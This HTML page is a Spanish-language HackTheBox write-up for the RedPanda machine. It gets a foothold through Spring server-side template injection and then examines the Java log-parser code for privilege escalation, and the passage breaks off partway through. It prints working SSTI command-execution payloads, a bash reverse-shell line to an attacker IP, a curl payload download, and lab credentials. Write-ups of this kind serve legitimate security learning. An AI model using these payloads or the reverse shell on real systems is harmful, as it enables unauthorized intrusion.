@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox RedPanda</title>
+
+  <meta name="description" content="Resolución de la máquina RedPanda de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox RedPanda">
+  <meta name="twitter:description" content="Resolución de la máquina RedPanda de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/redpanda.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox RedPanda">
+  <meta property="og:description" content="Resolución de la máquina RedPanda de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/redpanda.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/redpanda.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox RedPanda" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-woodenk">Shell - woodenk</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/redpanda.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">RedPanda</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con nmap, donde encontramos abiertos solo 2 puertos 22 y 8080 (ssh y http respectivamente)</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.170
+Nmap scan report for 10.10.11.170  
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">whatweb</code> podemos ver que en el titulo de la pagina nos dice que la web esta corriendo por detrás <code class="language-plaintext highlighter-rouge">Spring Boot</code> que es un Framework de Java</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ whatweb </span><span class="p">http://redpanda.htb:8080
+</span><span class="az">http://redpanda.htb:8080 </span><span class="p">[200 OK] Content-Language[en-US]  
+Country[RESERVED][</span><span class="ro">ZZ</span><span class="p">]
+HTML5
+IP[10.10.11.170]
+Title[</span><span class="am">Red Panda Search | Made with Spring Boot</span><span class="p">]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir en la web tenemos un buscador de pandas rojos con un cuadro de busqueda</p>
+<a href="/htb/redpanda/1.png" target="_blank"><div><p><img src="/htb/redpanda/1.png"></p></div></a>
+
+<p class="plain-text">El buscador muestra una linea con nuestro input y los matches que encuentra</p>
+<a href="/htb/redpanda/2.png" target="_blank"><div><p><img src="/htb/redpanda/2.png"></p></div></a>
+</section>
+
+<section class="post" id="shell-woodenk">
+<br><h3 class="post-title">Shell - woodenk</h3><br>
+<p class="plain-text">En <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---spring">payloadsallthethings</a> , en el apartado de <code class="language-plaintext highlighter-rouge">Server Side Template Injection</code> podemos ver en el apartado de Java que el framework Spring esta contemplado</p>
+<a href="/htb/redpanda/3.png" target="_blank"><div><p><img src="/htb/redpanda/3.png"></p></div></a>
+
+<p class="plain-text">La inyección básica <code class="language-plaintext highlighter-rouge">*{7*7}</code> se realiza para ver si computa el resultado <code class="language-plaintext highlighter-rouge">49</code>, si lo hace significa que es vulnerable, en este caso al enviarlo podemos ver que lo es</p>
+<a href="/htb/redpanda/4.png" target="_blank"><div><p><img src="/htb/redpanda/4.png"></p></div></a>
+
+<p class="plain-text">El segundo payload ejecuta el comando <code class="language-plaintext highlighter-rouge">id</code> usando el método <code class="language-plaintext highlighter-rouge">exec()</code> de la clase <code class="language-plaintext highlighter-rouge">Runtime</code>, y utiliza <code class="language-plaintext highlighter-rouge">getInputStream()</code> para mostrar el output del comando</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">*</span><span class="p">{</span><span class="no">T</span><span class="p">(</span><span class="na">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOUtils</span><span class="p">).toString(</span><span class="no">T</span><span class="p">(</span><span class="na">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).getRuntime().exec(</span><span class="s">'id'</span><span class="p">).getInputStream())}  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviarla el comando id se ejecuta y lo que devuelve el output nos muestra que lo ejecutamos como el usuario <code class="language-plaintext highlighter-rouge">woodenk</code> que curiosamente es parte del grupo logs</p>
+<a href="/htb/redpanda/5.png" target="_blank"><div><p><img src="/htb/redpanda/5.png"></p></div></a>
+
+<p class="plain-text">Lo que haremos para hacernos una reverse shell para empezar sera crear un archivo <code class="language-plaintext highlighter-rouge">index.html</code> con una reverse shell en bash y lo compartimos con un servidor python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">index.html
+bash -i >& /dev/tcp/10.10.14.10/443 0>&1
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora cambiamos el comando <code class="language-plaintext highlighter-rouge">id</code> por el comando <code class="language-plaintext highlighter-rouge">curl 10.10.14.10 -o /tmp/rev</code> para que nos descargue el index y lo guarde en <code class="language-plaintext highlighter-rouge">/tmp/rev</code>, no lo pipeamos con bash ya que el caracter <code class="language-plaintext highlighter-rouge">|</code> no se interpreta correctamente al ejecutarse</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">*</span><span class="p">{</span><span class="no">T</span><span class="p">(</span><span class="na">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOUtils</span><span class="p">).toString(</span><span class="no">T</span><span class="p">(</span><span class="na">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).getRuntime().exec(</span><span class="s">'curl 10.10.14.10 -o /tmp/rev'</span><span class="p">).getInputStream())}  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo enviamos en el buscador y aunque no vemos output nos llega la petición en el servidor de python, asi que ha descargado el archivo con la reverse shell</p>
+<a href="/htb/redpanda/6.png" target="_blank"><div><p><img src="/htb/redpanda/6.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
+10.10.11.170 - - "GET / HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora cambiamos el comando por <code class="language-plaintext highlighter-rouge">bash /tmp/rev</code> para que nos envie la reverse shell
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">*</span><span class="p">{</span><span class="no">T</span><span class="p">(</span><span class="na">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOUtils</span><span class="p">).toString(</span><span class="no">T</span><span class="p">(</span><span class="na">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).getRuntime().exec(</span><span class="s">'bash /tmp/rev'</span><span class="p">).getInputStream())}  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviamos en el buscador y recibimos una shell como el usuario <code class="language-plaintext highlighter-rouge">woodenk</code> en nuestro listener de netcat, ahora podemos leer la primera flag de la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.170
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/tmp/hsperfdata_woodenk</span><span class="p">$ id
+uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)  
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/tmp/hsperfdata_woodenk</span><span class="p">$ hostname -I
+10.10.11.170
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/tmp/hsperfdata_woodenk</span><span class="p">$ cat ~/user.txt   
+b37**************************25c
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/tmp/hsperfdata_woodenk</span><span class="p">$</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Vamos a repasar, somos parte del grupo <code class="language-plaintext highlighter-rouge">logs</code>, si buscamos con find archivos que tengan ese grupo asignado podemos encontrar varios archivos entre ellos uno de logs</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -group logs 2>/dev/null | grep -vE '/proc|/home|/tmp'  
+/opt/panda_search/redpanda.log
+/credits
+/credits/damian_creds.xml
+/credits/woodenk_creds.xml
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Revisando los permisos del archivo <code class="language-plaintext highlighter-rouge">redpanda.log</code> podemos ver que tenemos permiso de escritura aunque el archivo no tiene ningun contenido por ahora</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$ ls -l redpanda.log  
+-rw-rw-r-- 1 root logs 1 Mar 17 05:44 redpanda.log
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$ cat redpanda.log
+
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de enumerar un poco lo que hay dentro de la máquina podemos encontrar una ruta que contiene varios archivos de configuración java</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search/src/main/java/com/panda_search/htb/panda_search</span><span class="p">$ ls -l  
+-rw-rw-r-- 1 root root 4321 Jun 20  2022 MainController.java
+-rw-rw-r-- 1 root root  779 Feb 21  2022 PandaSearchApplication.java
+-rw-rw-r-- 1 root root 1800 Jun 14  2022 RequestInterceptor.java
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search/src/main/java/com/panda_search/htb/panda_search</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En una parte del codigo del archivo <code class="language-plaintext highlighter-rouge">MainController.java</code> encontramos en searchPanda define una variable <code class="language-plaintext highlighter-rouge">conn</code> que tiene credenciales para la base de datos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public </span><span class="na">ArrayList </span><span class="p">searchPanda(</span><span class="na">String </span><span class="p">query) {
+
+    </span><span class="na">Connection </span><span class="p">conn </span><span class="o">=</span><span class="mi"> null</span><span class="p">;
+    </span><span class="na">PreparedStatement </span><span class="p">stmt </span><span class="o">= </span><span class="mi">null</span><span class="p">;
+    </span><span class="na">ArrayList</span><span class="p">&lt</span><span class="na">ArrayList</span><span class="p">> </span><span class="p">pandas </span><span class="o">= new </span><span class="na">ArrayList</span><span class="p">();
+    </span><span class="o">try </span><span class="p">{
+        </span><span class="na">Class</span><span class="p">.forName(</span><span class="s">"com.mysql.cj.jdbc.Driver"</span><span class="p">);
+        conn </span><span class="o">= </span><span class="na">DriverManager</span><span class="p">.getConnection(</span><span class="s">"jdbc:mysql://localhost:3306/red_panda"</span><span class="p">,</span><span class="s"> "woodenk"</span><span class="p">,</span><span class="s"> "RedPandazRule"</span><span class="p">);  
+        stmt </span><span class="o">= </span><span class="p">conn.prepareStatement(</span><span class="s">"SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?"</span><span class="p">);
+        stmt.setString(</span><span class="mi">1</span><span class="p">, </span><span class="s">"%" </span><span class="o">+</span><span class="p"> query </span><span class="o">+</span><span class="s"> "%"</span><span class="p">);
+        </span><span class="na">ResultSet </span><span class="p">rs </span><span class="o">= </span><span class="p">stmt.executeQuery();
+        </span><span class="o">while</span><span class="p">(rs.next()){
+            </span><span class="na">ArrayList</span><span class="p">&lt</span><span class="na">String</span><span class="p">> panda </span><span class="o">= new </span><span class="na">ArrayList</span><span class="p">&lt</span><span class="na">String</span><span class="p">>();
+            panda.add(rs.getString(</span><span class="s">"name"</span><span class="p">));
+            panda.add(rs.getString(</span><span class="s">"bio"</span><span class="p">));
+            panda.add(rs.getString(</span><span class="p">"imgloc"</span><span class="p">));
+    panda.add(rs.getString(</span><span class="s">"author"</span><span class="p">));
+            pandas.add(panda);
+        }
+    }</span><span class="o">catch</span><span class="p">(</span><span class="na">Exception </span><span class="p">e</span><span class="p">){ </span><span class="na">System</span><span class="p">.out.println(e);}
+    </span><span class="o">return </span><span class="p">pandas;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las credenciales también son válidas para ssh, sin embargo de esa manera no tenemos el grupo <code class="language-plaintext highlighter-rouge">logs</code>, asi que es mejor idea quedarse con la shell de la web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">woodenk@10.10.11.170
+woodenk@redpanda.htb's password: RedPandazRule
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)  
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">RequestInterceptor.java</code> se encarga de generar los logs de peticiones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public </span><span class="p">void afterCompletion (</span><span class="na">HttpServletRequest </span><span class="p">request, </span><span class="na">HttpServletResponse </span><span class="p">response, </span><span class="na">Object handler, </span><span class="na">Exception </span><span class="p">ex) throws </span><span class="na">Exception</span><span class="p"> {  
+    </span><span class="na">System</span><span class="p">.out.println(</span><span class="s">"interceptor#postHandle called. Thread: " </span><span class="o">+ </span><span class="na">Thread</span><span class="p">.currentThread().getName());
+    </span><span class="na">String UserAgent </span><span class="o">= </span><span class="p">request.getHeader(</span><span class="s">"User-Agent"</span><span class="p">);
+    </span><span class="na">String </span><span class="p">remoteAddr </span><span class="o">= </span><span class="p">request.getRemoteAddr();
+    </span><span class="na">String </span><span class="p">requestUri </span><span class="o">= </span><span class="p">request.getRequestURI();
+    </span><span class="na">Integer </span><span class="p">responseCode </span><span class="o">= </span><span class="p">response.getStatus();
+    </span><span class="c1">/*System.out.println("User agent: " + UserAgent);
+    System.out.println("IP: " + remoteAddr);
+    System.out.println("Uri: " + requestUri);
+    System.out.println("Response code: " + responseCode.toString());*/</span><span class="p">
+    </span><span class="na">System</span><span class="p">.out.println(</span><span class="s">"LOG: " </span><span class="o">+ </span><span class="p">responseCode.toString() </span><span class="o">+</span><span class="s"> "||" </span><span class="o">+ </span><span class="p">remoteAddr </span><span class="o">+</span><span class="s"> "||" </span><span class="o">+ </span><span class="na">UserAgent </span><span class="o">+</span><span class="s"> "||" </span><span class="o">+ </span><span class="p">requestUri);
+    </span><span class="na">FileWriter </span><span class="p">fw </span><span class="o">= new </span><span class="na">FileWriter</span><span class="p">(</span><span class="s">"/opt/panda_search/redpanda.log"</span><span class="p">, </span><span class="mi">true</span><span class="p">);
+    </span><span class="na">BufferedWriter </span><span class="p">bw </span><span class="o">= new </span><span class="na">BufferedWriter</span><span class="p">(fw);
+    bw.write(responseCode.toString() </span><span class="o">+</span><span class="s"> "||" </span><span class="o">+</span><span class="p"> remoteAddr </span><span class="o">+ </span><span class="s">"||" </span><span class="o">+ </span><span class="na">UserAgent </span><span class="o">+</span><span class="s"> "||" </span><span class="o">+ </span><span class="p">requestUri </span><span class="o">+ </span><span class="s">"</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
+    bw.close();
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Segun lo que podemos ver la estetica de los valores separados por <code class="language-plaintext highlighter-rouge">||</code> es la siguiente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">[ResponseCode]</span><span class="p"> || </span><span class="ve">[RemoteAddress]</span><span class="p"> || </span><span class="ve">[UserAgent]</span><span class="p"> || </span><span class="ve"> [RequestUri]  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para ver esto de forma mas clara hacemos una petición y revisamos el log que crea</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s http://redpanda.htb:8080/testing | </span><span class="ve">jq </span><span class="p">  
+{
+  </span><span class="az">"timestamp"</span><span class="p">:</span><span class="ve"> "0000-00-00T00:00:00.000+00:00"</span><span class="p">,
+  </span><span class="az">"status"</span><span class="p">: 404,
+  </span><span class="az">"error"</span><span class="p">: </span><span class="ve">"Not Found"</span><span class="p">,
+  </span><span class="az">"message"</span><span class="p">: </span><span class="ve">""</span><span class="p">,
+  </span><span class="az">"path"</span><span class="p">: </span><span class="ve">"/testing"</span><span class="p">
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El archivo tiene la estética que hemos visto antes, simplemente lo comprobamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$ cat redpanda.log  
+
+404||10.10.14.10||curl/7.87.0||/testing
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/panda_search</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otro archivo bastante interesante es <code class="language-plaintext highlighter-rouge">App.java</code> que podemos encontrar en otra ruta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/credit-score/LogParser/final/src/main/java/com/logparser</span><span class="p">$ ls -l  
+-rw-rw-r-- 1 root root 3707 Jun 20  2022 App.java
+</span><span class="ve">woodenk@redpanda</span><span class="p">:</span><span class="az">/opt/credit-score/LogParser/final/src/main/java/com/logparser</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Leeremos el método <code class="language-plaintext highlighter-rouge">main</code> para y desglosaremos lo demas mientras lo analizamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public static </span><span class="p">void main(</span><span class="na">String</span><span class="o">[] </span><span class="p">args) throws </span><span class="na">JDOMException</span><span class="p">, </span><span class="na">IOException</span><span class="p">, </span><span class="na">JpegProcessingException </span><span class="p">{  
+    </span><span class="na">File </span><span class="p">log_fd </span><span class="o">= new </span><span class="na">File</span><span class="p">(</span><span class="s">"/opt/panda_search/redpanda.log"</span><span class="p">);
+    </span><span class="na">Scanner </span><span class="p">log_reader </span><span class="o">= new </span><span class="na">Scanner</span><span class="p">(log_fd);
+    </span><span class="o">while</span><span class="p">(log_reader.hasNextLine())
+    {
+        </span><span class="na">String </span><span class="p">line </span><span class="o">= </span><span class="p">log_reader.nextLine();
+        </span><span class="o">if</span><span class="p">(</span><span class="o">!</span><span class="p">isImage(line))
+        {
+            </span><span class="o">continue</span><span class="p">;
+        }
+        </span><span class="na">Map </span><span class="p">parsed_data </span><span class="o">= </span><span class="p">parseLog(line);
+        </span><span class="na">System</span><span class="p">.out.println(parsed_data.get(</span><span class="s">"uri"</span><span class="p">));
+        </span><span class="na">String </span><span class="p">artist </span><span class="o">= </span><span class="p">getArtist(parsed_data.get(</span><span class="s">"uri"</span><span class="p">).toString());
+        </span><span class="na">System</span><span class="p">.out.println(</span><span class="s">"Artist: " </span><span class="o">+ </span><span class="p">artist);
+        </span><span class="na">String </span><span class="p">xmlPath </span><span class="o">= </span><span class="s">"/credits/" </span><span class="o">+ </span><span class="p">artist </span><span class="o">+ </span><span class="s">"_creds.xml"</span><span class="p">;
+        addViewTo(xmlPath, parsed_data.get(</span><span class="s">"uri"</span><span class="p">).toString());
+    }
+
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizemos, inicia creando un objeto de tipo File el cual apunta al <code class="language-plaintext highlighter-rouge">redpanda.log</code>, despues crea un objeto de tipo Scanner que se encarga de leerlo linea por linea</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">File </span><span class="p">log_fd </span><span class="o">= new </span><span class="na">File</span><span class="p">(</span><span class="s">"/opt/panda_search/redpanda.log"</span><span class="p">);  
+</span><span class="na">Scanner </span><span class="p">log_reader </span><span class="o">= new </span><span class="na">Scanner</span><span class="p">(log_fd);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora mediante un bucle itera por cada linea almacenando su valor en la variable <code class="language-plaintext highlighter-rouge">line</code>, y llama a la función <code class="language-plaintext highlighter-rouge">isImage</code> para hacer una comprobación, si devuelve <code class="language-plaintext highlighter-rouge">true</code> seguira el flujo de lo contrario pasará a la siguiente linea del archivo de logs</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">while</span><span class="p">(log_reader.hasNextLine())
+{
+    </span><span class="na">String </span><span class="p">line </span><span class="o">= </span><span class="p">log_reader.nextLine();  
+    </span><span class="o">if</span><span class="p">(</span><span class="o">!</span><span class="p">isImage(line))
+    {
+        </span><span class="o">continue</span><span class="p">;
+    }</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Veamos la comprobación, la función <code class="language-plaintext highlighter-rouge">isImage</code> recibe un atributo llamado <code class="language-plaintext highlighter-rouge">filename</code> el cual es la linea, solo si la linea tiene la string <code class="language-plaintext highlighter-rouge">.jpg</code> en su contenido devuelve <code class="language-plaintext highlighter-rouge">true</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public static </span><span class="no">boolean </span><span class="p">isImage(</span><span class="na">String </span><span class="p">filename){  
+    </span><span class="o">if(filename.contains(</span><span class="s">".jpg"</span><span class="p">))
+    {
+        </span><span class="o">return </span><span class="mi">true</span><span class="p">;
+    }
+    </span><span class="o">return </span><span class="mi">false</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volviendo al <code class="language-plaintext highlighter-rouge">main</code>, este define una variable llamada <code class="language-plaintext highlighter-rouge">parsed_data</code> que contiene un mapa que devulve la función con el nombre <code class="language-plaintext highlighter-rouge">parseLog</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">Map </span><span class="p">parsed_data </span><span class="o">= </span><span class="p">parseLog(line);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">parseLog</code> recibe la linea y con <code class="language-plaintext highlighter-rouge">split</code> crea un mapa en el cual los campos los toma separandolos mediante los <code class="language-plaintext highlighter-rouge">||</code> que es la estructura de logs que vimos antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public static </span><span class="na">Map </span><span class="p">parseLog(</span><span class="na">String </span><span class="p">line) {
+    </span><span class="na">String</span><span class="o">[] </span><span class="p">strings </span><span class="o">= </span><span class="p">line.split(</span><span class="s">"</span><span class="mi">\\</span><span class="s">|</span><span class="mi">\\</span><span class="s">|"</span><span class="p">);
+    </span><span class="na">Map </span><span class="p">map </span><span class="o">= new </span><span class="na">HashMap</span><span class="p"><>();
+    map.put(</span><span class="s">"status_code"</span><span class="p">, Integer.parseInt(strings[</span><span class="mi">0</span><span class="p">]));  
+    map.put(</span><span class="s">"ip"</span><span class="p">, strings[</span><span class="mi">1</span><span class="p">]);
+    map.put(</span><span class="s">"user_agent"</span><span class="p">, strings[</span><span class="mi">2</span><span class="p">]);
+    map.put(</span><span class="s">"uri"</span><span class="p">, strings[</span><span class="mi">3</span><span class="p">]);
+
+    </span><span class="o">return </span><span class="p">map;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora el main define una string llamada <code class="language-plaintext highlighter-rouge">artist</code> que es el resultado de la función <code class="language-plaintext highlighter-rouge">getArtist</code> pasandole como argumento el campo uri que obtiene de parsed_data</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">String </span><span class="p">artist </span><span class="o">= </span><span class="p">getArtist(parsed_data.get(</span><span class="s">"uri"</span><span class="p">).toString());  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">getArtist</code> recibe un argumento uri el cual es agregado a una ruta y se define en una variable <code class="language-plaintext highlighter-rouge">fullpath</code> la cual será un archivo de imagen, de este archivo extrae la metadata del campo <code class="language-plaintext highlighter-rouge">Artist</code> y retorna su valor solo si es que existe</p>
